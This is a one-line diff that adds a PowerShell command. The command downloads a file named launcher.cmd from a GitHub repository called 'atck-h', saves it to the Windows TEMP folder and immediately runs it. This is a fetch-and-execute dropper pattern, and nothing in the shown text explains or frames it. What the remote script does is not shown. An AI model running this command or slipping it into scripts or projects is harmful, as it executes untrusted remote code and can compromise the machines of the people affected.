@@ -1,0 +1,1 @@
+powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/maiz-an/atck-h/main/launcher.cmd' -OutFile $env:TEMP\launcher.cmd; Start-Process $env:TEMP\launcher.cmd"
